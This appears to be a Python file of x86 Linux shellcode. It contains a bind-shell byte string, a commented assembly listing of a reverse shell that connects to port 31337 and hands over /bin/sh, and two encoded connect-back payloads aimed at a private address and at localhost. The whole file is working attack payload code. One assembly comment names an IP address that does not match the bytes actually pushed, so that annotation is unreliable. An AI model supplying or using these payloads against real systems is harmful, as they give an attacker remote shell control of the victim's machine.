bind = "\x6a\x66"   \
  "\x58"			\
  "\x6a\x01"		\
  "\x5b"			\
  "\x99"			\
  "\x52"			\
  "\x53"			\
  "\x6a\x02"		\
  "\x89\xe1"		\
  "\xcd\x80"		\

  "\x52"			\
  "\x66\x68\xfc\xc9"\
  "\x66\x6a\x02"	\
  "\x89\xe1"		\
  "\x6a\x10"		\
  "\x51"			\
  "\x50"			\
  "\x89\xe1"		\
  "\x89\xc6"		\
  "\x43"			\
  "\xb0\x66"		\
  "\xcd\x80"		\

  "\xb0\x66"        \
  "\xd1\xe3"		\
  "\xcd\x80"		\

  "\x52"            \
  "\x56"			\
  "\x89\xe1"		\
  "\x43"			\
  "\xb0\x66"		\
  "\xcd\x80"		\

  "\x93"			\

  "\x6a\x02"		\
  "\x59"			\

  "\xb0\x3f"		\
  "\xcd\x80"		\
  "\x49"			\
  "\x79\xf9"		\

  "\x6a\x0b"		\
  "\x58"			\
  "\x52"			\
  "\x68\x2f\x2f\x73\x68"\
  "\x68\x2f\x62\x69\x6e"\
  "\x89\xe3"	\
  "\x52"		\
  "\x53"		\
  "\x89\xe1"	\
  "\xcd\x80"

"""
BITS 32
    ; s = socket(2, 1, 0)
    push BYTE 0x66 ; socketcall is syscall #102 (0x66).
    pop eax
    cdq ; Zero out edx for use as a null DWORD later.
    xor ebx, ebx ; ebx is the type of socketcall.
    inc ebx ; 1 = SYS_SOCKET = socket()
    push edx ; Build arg array: { protocol = 0,
    push BYTE 0x1 ; (in reverse) SOCK_STREAM = 1,
    push BYTE 0x2 ; AF_INET = 2 }
    mov ecx, esp ; ecx = ptr to argument array
    int 0x80 ; After syscall, eax has socket file descriptor.
    xchg esi, eax ; Save socket FD in esi for later.
    ; connect(s, [2, 31337, <IP address>], 16)
    push BYTE 0x66 ; socketcall (syscall #102)
    pop eax
    inc ebx ; ebx = 2 (needed for AF_INET)
    push DWORD 0x9bf8a8c0 ; Build sockaddr struct: IP address = 192.168.42.72
    push WORD 0x697a ; (in reverse order) PORT = 31337
    push WORD bx ; AF_INET = 2
    mov ecx, esp ; ecx = server struct pointer
    push BYTE 16 ; argv: { sizeof(server struct) = 16,
    push ecx ; server struct pointer,
    push esi ; socket file descriptor }
    mov ecx, esp ; ecx = argument array
    inc ebx ; ebx = 3 = SYS_CONNECT = connect()
    int 0x80 ; eax = connected socket FD
    ; dup2(connected socket, {all three standard I/O file descriptors})
    xchg eax, ebx ; Put socket FD in ebx and 0x00000003 in eax.
    push BYTE 0x2 ; ecx starts at 2.
    pop ecx
    dup_loop:
    mov BYTE al, 0x3F ; dup2 syscall #63
    int 0x80 ; dup2(c, 0)
    dec ecx ; Count down to 0.
    jns dup_loop ; If the sign flag is not set, ecx is not negative.
    ; execve(const char *filename, char *const argv [], char *const envp[])
    mov BYTE al, 11 ; execve syscall #11.
    push edx ; push some nulls for string termination.
    push 0x68732f2f ; push "//sh" to the stack.
    push 0x6e69622f ; push "/bin" to the stack.
    mov ebx, esp ; Put the address of "/bin//sh" into ebx via esp.
    push edx ; push 32-bit null terminator to stack.
    mov edx, esp ; This is an empty array for envp.
    push ebx ; push string addr to stack above null terminator.
    mov ecx, esp ; This is the argv array with string ptr.
    int 0x80 ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
"""
connect_back_shell = "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xc0\xa8\xf8\x9b\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
connect_back_shel_ = "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\x7f\x00\x00\x01\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"